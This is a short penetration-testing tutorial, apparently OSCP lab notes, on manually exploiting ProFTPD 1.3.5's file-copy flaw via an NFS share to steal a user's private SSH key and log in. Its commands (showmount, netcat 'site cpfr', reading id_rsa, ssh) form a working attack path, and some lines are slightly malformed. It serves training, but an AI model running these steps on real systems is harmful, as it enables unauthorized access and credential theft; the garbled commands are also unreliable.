# Practical Exploitation

## Practical Exploitation?

Sometimes we're faced with exploits that require more than one service to be running in order for the exploit to work, however, they might be situations in which we don't have one service that's required for the exploit to work but oddly enough we may face another port from which we can take advantage of to successfully exploit the vulnerability manually. This process is very practical and thorough, let's take this simple case scenario:

After some recon and some enumeration, we found that NFS is running and that ProFtpd 1.3.5 is running but HTTP isn't.

Performing some searching for exploits shows that this version of ProFtpd is vulnerable:

{% embed url="https://www.exploit-db.com/exploits/36803" %}

However, at inspecting the exploit we can see that it uses a PHP Payload and HTTP URL but our target doesn't have HTTP running.

Let's startup with what we have, NFS and FTP.

Starting up with NFS:

```text
showmount -e 172.31.122
mount -o default 172.31.1.22:/var/nfsbackups nfss/
ls nfss
```

NFS is mounted but does not have any contents.

Let's continue with FTP and let's follow the exploitation taken in the exploit by manually executing the commands:

```text
nc -vvv 172.31.1.22 21
ftp>site cpfr /home/daniel
ftp>/var/nfsbackups/daniel
ftp>exit
cat nfss/daniel/.ssh/id_rsa
cat nfss/daniel/.ssh/id_rsa.pub
ssh -i id_rsa daniel@172.31.1.22
```

This way, we were able to successfully exploit the system manually, gain some SSH keys, and used them to authenticate to the target.

## Reference

The scenario was taken from here:

{% embed url="https://www.bytefellow.com/oscp-ultimate-cheatsheet/\#ftoc-exploiting-nfs-and-ftp" %}



